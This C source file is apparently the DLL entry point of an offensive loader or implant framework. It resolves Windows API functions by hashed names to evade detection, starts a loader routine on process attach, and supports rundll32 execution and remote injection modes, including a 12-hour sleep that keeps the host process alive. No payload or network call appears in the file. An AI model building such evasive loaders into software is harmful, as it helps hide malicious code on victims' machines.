#include <Ldr.h>
#include <Config.h>
#include <common/phnt.h>
#include <common/Macros.h>
#include <core/Win32.h>
#include <common/Defines.h>

#include <common/Debug.h>


#if ( defined( DLL ) && ( DLL == TRUE ) )

DLLEXPORT VOID 
DLL_START( 
    VOID
) {
#if ( defined( EXEC_INJECT_REMOTE ) && ( EXEC_INJECT_REMOTE == FALSE ) ) && \
    ( defined( EXEC_RUNDLL32 ) && ( EXEC_RUNDLL32 == TRUE ) )
    // sleep 12 hours to keep the rundll32 process alive
    PVOID Kernel32 = LdrGetModuleBase( H_DLL( KERNEL32 ) );

    typeof( & Sleep ) Kernel32$Sleep = LdrGetFuncAddr( Kernel32, H_API( Sleep ) );

    Kernel32$Sleep( 12 * 60 * 60 * 1000 );
#endif // EXEC_INJECT_REMOTE == FALSE && EXEC_RUNDLL32 == TRUE

#if ( defined( EXEC_INJECT_REMOTE ) && ( EXEC_INJECT_REMOTE == TRUE ) ) && \
    ( defined( EXEC_RUNDLL32 ) && ( EXEC_RUNDLL32 == TRUE ) )
    DBGINIT()

    LdrMain();
#endif // EXEC_INJECT_REMOTE == TRUE && EXEC_RUNDLL32 == TRUE
}


#pragma comment( linker, "/ENTRY:DllMain" )
BOOL 
APIENTRY DllMain( 
    IN     HINSTANCE DllBase, 
    IN     DWORD     dwReason, 
    IN OUT LPVOID    lpReserved 
) {
    switch ( dwReason ) {

        case DLL_PROCESS_ATTACH: {

#if ( defined( EXEC_INJECT_REMOTE ) && ( EXEC_INJECT_REMOTE == FALSE ) ) && \
    ( defined( EXEC_RUNDLL32 ) && ( EXEC_RUNDLL32 == TRUE ) )

            DBGINIT()

            PVOID Kernel32 = LdrGetModuleBase( H_DLL( KERNEL32 ) );

            typeof( & CreateThread ) Kernel32$CreateThread = LdrGetFuncAddr( Kernel32, H_API( CreateThread ) );

            Kernel32$CreateThread( NULL, 0, C_PTR( LdrMain ), DllBase, 0, NULL );
#endif // EXEC_INJECT_REMOTE == FALSE && EXEC_RUNDLL32 == TRUE
            break;
        }
        
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH: {
            break;
        }
    }

    return TRUE;
}

#endif // DLL == TRUE